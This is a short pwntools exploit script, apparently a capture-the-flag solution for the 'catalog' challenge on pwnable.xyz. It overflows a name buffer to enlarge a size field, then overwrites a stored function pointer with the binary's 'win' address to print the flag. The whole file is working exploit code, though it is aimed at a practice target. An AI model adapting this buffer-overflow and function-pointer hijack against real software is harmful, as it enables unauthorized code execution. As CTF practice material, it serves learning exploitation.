from pwn import *

context.terminal = ["alacritty", "-e", "sh", "-c"]
exe = ELF("catalog")
# r = process(exe.path)
r = remote("svc.pwnable.xyz", 30023)

r.recvuntil("> ")
r.sendline("1")
r.recvuntil("name: ")
r.sendline("A" * 0x1f)

r.recvuntil("> ")
r.sendline("2")
r.recvuntil("index: ")
r.sendline("0")
r.recvuntil("name: ")
# 2 is buffer to stdin so newline isn't read into 
# the name field
r.sendline(b"A" * 0x20 + p8(0xff) + b"2")

r.recvuntil("index: ")
r.sendline("0")
r.recvuntil("name: ")
payload = b"A" * 0x20              # name buffer
payload += b"A" * 0x8              # size 
payload += p64(exe.symbols["win"]) # print_name func
r.sendline(payload)

r.recvuntil("> ")
r.sendline("3")
r.recvuntil("index: ")
r.sendline("0")
log.success(r.recvline().strip().decode())

r.close()

